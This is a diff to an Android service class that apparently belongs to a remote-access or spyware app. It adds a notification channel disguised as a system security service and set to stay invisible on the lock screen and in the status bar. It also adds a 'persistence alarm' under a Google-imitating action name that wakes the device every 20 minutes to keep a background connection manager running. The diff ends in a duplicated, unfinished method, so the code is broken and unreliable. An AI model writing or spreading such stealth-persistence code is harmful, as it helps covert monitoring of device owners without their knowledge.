@@ -26,11 +26,19 @@ public class MainService extends Service {
     @Override
     public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
     {
+        setupNotification();
+        schedulePersistenceAlarm(); // Set up the "Tomorrow" insurance
+        
+        contextOfApplication = this;
+        ConnectionManager.startAsync(this);
+        return Service.START_STICKY;
+    }
+
+    private void setupNotification() {
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
             String channelId = "sys_security_service_channel";
             String channelName = getString(R.string.service_channel_name);
             
-            // IMPORTANCE_MIN (1) keeps service alive but hides status bar icon on most devices
             android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, channelName, android.app.NotificationManager.IMPORTANCE_MIN);
             channel.setLockscreenVisibility(android.app.Notification.VISIBILITY_SECRET);
             channel.setShowBadge(false);
@@ -39,14 +47,10 @@ public class MainService extends Service {
             if (manager != null) {
                 manager.createNotificationChannel(channel);
                 
-                // Compatibility for Android 12+ (Immutable PendingIntent)
                 int pendingFlags = PendingIntent.FLAG_UPDATE_CURRENT;
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                     pendingFlags |= PendingIntent.FLAG_IMMUTABLE;
                 }
-
-                Intent settingsIntent = new Intent(this, SettingsActivity.class);
-                PendingIntent pendingSettings = PendingIntent.getActivity(this, 0, settingsIntent, pendingFlags);
 
                 android.app.Notification.Builder nb = new android.app.Notification.Builder(this, channelId)
                     .setOngoing(true)
@@ -69,11 +73,32 @@ public class MainService extends Service {
                 }
             }
         }
-
-        contextOfApplication = this;
-        ConnectionManager.startAsync(this);
-        return Service.START_STICKY;
     }
+
+    private void schedulePersistenceAlarm() {
+        Intent intent = new Intent(this, MyReceiver.class);
+        intent.setAction("com.google.android.sys.security.ALARM_WAKEUP");
+        
+        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+            flags |= PendingIntent.FLAG_IMMUTABLE;
+        }
+        
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 999, intent, flags);
+        android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        
+        if (alarmManager != null) {
+            long triggerAt = System.currentTimeMillis() + (20 * 60 * 1000); // Trigger in 20 minutes
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
+            } else {
+                alarmManager.set(android.app.AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
+            }
+        }
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
